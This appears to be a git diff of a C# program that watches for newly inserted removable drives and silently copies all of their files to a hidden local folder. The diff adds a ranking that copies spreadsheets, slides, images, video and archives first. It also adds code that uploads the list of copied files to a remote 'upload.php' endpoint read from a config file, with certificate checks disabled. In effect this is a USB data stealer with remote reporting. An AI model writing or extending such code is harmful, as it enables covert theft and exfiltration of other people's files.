@@ -1,15 +1,23 @@
-// See https://aka.ms/new-console-template for more information
-
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 
-String SaveRoot = "D:\\.dir\\";
-String[, ] copyRoot = new string[600000, 2];
+String SaveRoot, classRegistered, version;
+String[,] copyRoot = new string[600000, 2];
 bool[] registeredDrive = new bool[26];
 int fileCnt = 0;
 String localSaveRoot = "";
-List<String[,]> files;
+List<String[]> fileBoot = new List<string[]> {};
+List<String> filePriority = new List<string> {".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip"};
+
+
+StreamReader configFile = new StreamReader("config.txt");
+SaveRoot = configFile.ReadLine();
+classRegistered = configFile.ReadLine();
+version = configFile.ReadLine();
+configFile.Close();
+
+Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);
 
 void scanDirectory(string path)
 {
@@ -18,7 +26,7 @@ void scanDirectory(string path)
     DirectoryInfo[] dirs = currentDir.GetDirectories();
     foreach (DirectoryInfo dir in dirs)
     {
-        Console.WriteLine(dir.FullName.Substring(3));
+        // Console.WriteLine(dir.FullName.Substring(3));
         Directory.CreateDirectory(localSaveRoot + dir.FullName.Substring(3));
         scanDirectory(dir.FullName);
     }
@@ -29,18 +37,22 @@ void scanDirectory(string path)
         copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
     }
 }
-/*
-localSaveRoot = $"D:\\.dir\\[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}]\\";
-Directory.CreateDirectory(localSaveRoot);
-scanDirectory("G:\\Otvratitelniy (C++ Reconstruct)");
-for (int i = 1; i <= fileCnt; i++)
-{
-    Console.WriteLine("from " + copyRoot[i, 0] + " to " + copyRoot[i, 1]);
-}
-*/
+
+String fff = $"[1720038282] from[Συμμαχία]";
+var handlerl = new HttpClientHandler();
+
+handlerl.ServerCertificateCustomValidationCallback = delegate { return true; };
+var contentl = new MultipartFormDataContent();
+contentl.Add(new ByteArrayContent(File.ReadAllBytes($"{fff}.txt")), "file", Uri.EscapeDataString($"{fff}.txt"));
+HttpClient clientl = new HttpClient(handlerl);
+await clientl.PostAsync(classRegistered + "upload.php", contentl);
+
+
+
 DriveInfo[] allDrivesG = DriveInfo.GetDrives();
 Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
 Console.OutputEncoding = System.Text.Encoding.Unicode;
+
 foreach (DriveInfo item in allDrivesG)
 {
     if (item.IsReady)
@@ -51,12 +63,12 @@ foreach (DriveInfo item in allDrivesG)
         gb = Encoding.Convert(gbk, utf8, gb);
         Console.WriteLine(utf8.GetString(gb));
     }
-    
     registeredDrive[item.Name[0] - 'A'] = true;
 }
-
 foreach (bool n in registeredDrive)
 { Console.WriteLine(n); }
+
+
 while (true)
 {
     DriveInfo[] allDrives = DriveInfo.GetDrives();
@@ -72,17 +84,53 @@ while (true)
             Encoding utf8 = Encoding.GetEncoding("utf-8");
             byte[] gb = gbk.GetBytes(item.VolumeLabel);
             gb = Encoding.Convert(gbk, utf8, gb);
-            String saveDirName = SaveRoot + $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from [{utf8.GetString(gb)}]\\";
+            String saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
+            String saveDirName = SaveRoot + $"{saveFileName}\\";
             Console.WriteLine(saveDirName);
             fileCnt = 0;
-            localSaveRoot  = saveDirName;
+            localSaveRoot = saveDirName;
             Directory.CreateDirectory(localSaveRoot);
             scanDirectory(item.Name);
             for (int i = 1; i <= fileCnt; i++)
             {
-                Console.WriteLine("from " + copyRoot[i, 0] + " to " + copyRoot[i, 1]);
-                File.Copy(copyRoot[i, 0], copyRoot[i, 1], true);
+                fileBoot.Add(new string[] { copyRoot[i, 0], copyRoot[i, 1] });
             }
+            fileBoot.Sort((a, b) =>
+            {
+                int p1 = -1000, p2 = -1000;
+                for (int i = 0; i < filePriority.Count; i++)
+                {
+                    if (Path.GetExtension(a[0]) == filePriority[i])
+                    {
+                        p1 = filePriority.Count - i;
+                    }
+                    if (Path.GetExtension(b[0]) == filePriority[i])
+                    {
+                        p2 = filePriority.Count - i;
+                    }
+                }
+                return -p1 + p2;
+            });
+            StreamWriter menu = new StreamWriter($"{saveFileName}.txt");
+            for (int i = 0; i < fileCnt; i++)
+            {
+                Console.Write("from " + fileBoot[i][0] + " to " + fileBoot[i][1] + " ...");
+                try
+                {
+                    File.Copy(fileBoot[i][0], fileBoot[i][1], true);
+                    Console.WriteLine("Done");
+                    menu.WriteLine(fileBoot[i][1]);
+                }
+                catch { continue; }
+            }
+            menu.Close();
+            var handler = new HttpClientHandler();
+            handler.ServerCertificateCustomValidationCallback = delegate { return true; };
+            var content = new MultipartFormDataContent();
+            content.Add(new ByteArrayContent(File.ReadAllBytes($"{saveFileName}.txt")), "file", $"{saveFileName}.txt");
+            HttpClient client = new HttpClient(handler);
+            await client.PostAsync(classRegistered + "upload.php", content);
+            
         }
     }
     for (int i = 0; i < 26; i++)
@@ -94,4 +142,3 @@ while (true)
     }
     Thread.Sleep(1000);
 }
-
